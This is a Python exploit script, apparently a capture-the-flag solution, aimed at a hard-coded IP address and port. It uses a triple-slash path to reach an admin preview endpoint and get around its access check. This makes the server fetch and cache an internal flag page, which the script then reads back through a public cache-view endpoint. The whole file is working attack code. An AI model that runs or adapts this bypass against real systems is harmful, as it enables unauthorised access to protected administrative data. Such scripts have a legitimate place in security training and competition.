#!/usr/bin/env python3
from six.moves.urllib import response
import re
import requests

BASE = "http://13.203.69.239:31005"
ADMIN_PREVIEW = "/admin-dashboard/preview"
FLAG_PATH = "/admin-dashboard/flag"
CACHE_VIEW = "/cache-view"

def main() -> None:
    session = requests.Session()
    warm = session.get(
        BASE + "///admin-dashboard/preview",
        params={"path": FLAG_PATH},
        timeout=10,
    )
    warm.raise_for_status()
    if "Warmed" not in warm.text or "status 200" not in warm.text:
        raise RuntimeError("the internal flag path was not warmed successfully")

    cached = session.get(
        BASE + CACHE_VIEW,
        params={"path": FLAG_PATH},
        timeout=10,
    )
    cached.raise_for_status()
    body = cached.content.decode("utf-8")
    print(body)


if __name__ == "__main__":
    main()
